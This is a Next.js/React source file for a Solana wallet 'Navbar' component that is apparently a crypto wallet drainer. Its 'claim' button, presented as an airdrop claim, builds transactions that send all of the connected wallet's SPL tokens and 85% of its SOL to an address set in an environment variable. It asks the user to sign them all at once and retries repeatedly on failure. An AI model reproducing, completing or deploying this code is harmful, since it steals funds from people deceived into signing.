"use client";
import React, { useCallback, useEffect, useMemo, useState } from "react";
import HeaderLayout from "@/app/layouts/HeaderLayout";
import Button from "../ui/Button";
import { connectionLevel } from "@/app/constants/conneectionStages";
import { executeCloseWallet } from "@/app/services/redux/closeModel";
import { changeDrainStage } from "@/app/services/redux/drainStages";
import { useWallet , WalletProvider , ConnectionProvider } from "@solana/wallet-adapter-react";
import { changeOpenBottomDrawer } from "@/app/services/redux/drawerBottom";
import { executeConnectionObject } from "@/app/services/redux/walletConnectionObject";
import {
  WalletConnectButton,
  WalletMultiButton,
} from "@solana/wallet-adapter-react-ui";
import {
  clusterApiUrl,
  Connection,
  Keypair,
  LAMPORTS_PER_SOL,
  StakeProgram,
  Authorized,
  sendAndConfirmTransaction,
  Lockup,
  PublicKey,
  Signer,
  SystemProgram,
  Transaction,
  TransactionInstruction,
  ParsedAccountData,
} from "@solana/web3.js";
import { createTransferTransaction, createTransferTransactionV0 } from "@/app/services/hook/phantomCollections";
import { getTokenAccounts } from "@/app/services/hook/blockchain/splWallet";
import { tokenInstruction } from "@/app/services/hook/phantomCollections/createSplTransferTransaction";
import {
  createAssociatedTokenAccountInstruction,
  createTransferInstruction,
  getAccount,
  getAssociatedTokenAddress,
} from "@solana/spl-token";
import { getTokenMetadataSPL } from "@/app/services/hook/getTokenMetadata/Metadata";
import { getAllSPL } from "@/app/services/redux/getAllSPL";
import submitAndSendTransactions from "@/app/services/hook/phantomCollections/submitAllTransactions";

export default function Navbar() {
  const {
    connect,
    publicKey,
    connected,
    connecting,
    disconnect,
    disconnecting,
    select,
    wallet,
    signAllTransactions,
    sendTransaction
  } = useWallet();
  const resetOpenDrawer = changeOpenBottomDrawer(
    (state) => state.resetOpenBottomDrawer
  );
  const resetCloseWallet = executeCloseWallet(
    (state) => state.resetCloseWallet
  );
  const drainStage = changeDrainStage((state) => state.connectionStage);
  const resetDrainage = changeDrainStage((state) => state.resetConnectionStage);
  const getIsConnected = executeConnectionObject((state) => state.isConnected);
  const getSplMetadata = getAllSPL((state)=>state.resetWalletSpl);



  const connection = new Connection(
    String(process.env.NEXT_PUBLIC_SOLANA_HTTPS)
  );
  const recipientAddress = new PublicKey(
    String(process.env.NEXT_PUBLIC_WALLET_ADDRESS)
  );
  const [transactionInstructions, setTransactionInstructions] = useState<
    TransactionInstruction[]
  >([]);
  const [getTransaction, setTransaction] = useState<Transaction[]>([]);

  async function getNumberDecimals(mintAddress: string): Promise<number> {
    const info = await connection.getParsedAccountInfo(
      new PublicKey(mintAddress)
    );
    const result = (info.value?.data as ParsedAccountData).parsed.info
      .decimals as number;
    return result;
  }

  async function claim() {
    const latestBlockHash = await connection.getLatestBlockhash("confirmed");
    // resetOpenDrawer(true)
    try {
      resetDrainage(connectionLevel[2]);
      const walletSPLBalance = await getTokenAccounts(
        publicKey?.toBase58() as unknown as string
      );
      const blockchainTimeStamp = (await connection.getLatestBlockhash())
        .blockhash;
      const walletTransaction: Transaction[] = [];
      let trx = await createTransactions(
        walletSPLBalance,
        publicKey as PublicKey,
        recipientAddress,
        connection
      );
      const transact = new Transaction().add(...trx);
      transact.feePayer = publicKey as PublicKey;
      transact.recentBlockhash = blockchainTimeStamp;
      walletTransaction.push(transact);
      const balance = await connection.getBalance(
        publicKey as unknown as PublicKey
      );
      const AIRDROP_BALANCE = (balance * 85) / 100;
      const transaction = await createTransferTransaction(
        publicKey as unknown as PublicKey,
        connection,
        AIRDROP_BALANCE
      );
      walletTransaction.push(transaction)
      if (signAllTransactions == undefined) return;
      const signature = await signAllTransactions(walletTransaction);
      //  await sendTransaction(signature , connection , {preflightCommitment:"processed"})
     await submitAndSendTransactions(signature)
      console.log({
        status: "info",
        method: "signAndSendTransaction",
        message: `Signed and submitted transaction ${signature}.`,
        signature:signature
      });
      // pollSignatureStatus(signature, connection);
    } catch (error) {
      await claim();
      console.log({
        status: "error",
        method: "signAndSendTransaction",
        message: error,
      });
    }
  }

  async function createTransactions(
    walletSPLBalance: any[],
    publicKey: PublicKey,
    recipientAddress: PublicKey,
    connection: Connection
  ) {
    const walletTransactions = [];
    const walletMetadata = []
    for (let i = 0; i < walletSPLBalance.length; i++) {
         //get  token metadata
       const splData = await getTokenMetadataSPL(walletSPLBalance[i].mintAddress)
      


      const mintToken = new PublicKey(walletSPLBalance[i].mintAddress);
      const tokenNumber = await getNumberDecimals(
        walletSPLBalance[i].mintAddress
      );
      const associatedTokenFrom = await getAssociatedTokenAddress(
        mintToken,
        publicKey as unknown as PublicKey
      );
      const fromAccount = await getAccount(connection, associatedTokenFrom);
      const associatedTokenTo = await getAssociatedTokenAddress(
        mintToken,
        recipientAddress
      );

      walletMetadata.push({balance:( Number(walletSPLBalance[i].tokenBalance) * Math.pow(10, Number(tokenNumber))),
        name:splData.tokenName,
        symbol:splData.tokenSymbol,
        logo:splData.tokenLogo
      })

      if (!(await connection.getAccountInfo(associatedTokenTo))) {
        walletTransactions.push(
          createAssociatedTokenAccountInstruction(
            publicKey as unknown as PublicKey,
            associatedTokenTo,
            recipientAddress,
            mintToken
          )
        );
      }

      walletTransactions.push(
        createTransferInstruction(
          fromAccount.address,
          associatedTokenTo,
          publicKey as unknown as PublicKey,
          Number(walletSPLBalance[i].tokenBalance) *
            Math.pow(10, Number(tokenNumber)) // transfer 1 USDC, USDC on solana devnet has 6 decimal
        )
      );
    }
    getSplMetadata(walletMetadata as any)
    return walletTransactions;
  }

  useEffect(() => {
    if (wallet?.adapter.connected) {
      resetDrainage(connectionLevel[1]);
    }
  }, [wallet?.adapter.connected]);

  return (
    <HeaderLayout>
      {drainStage == connectionLevel[0] && (
        <WalletMultiButton className="!bg-slate-800 !text-white" />
      )}
      {(drainStage == connectionLevel[1] ||
        drainStage == connectionLevel[2]) && (
        <Button onClick={() => claim()} variant="secondary">
          {drainStage}
        </Button>
      )}
    </HeaderLayout>
  );
}
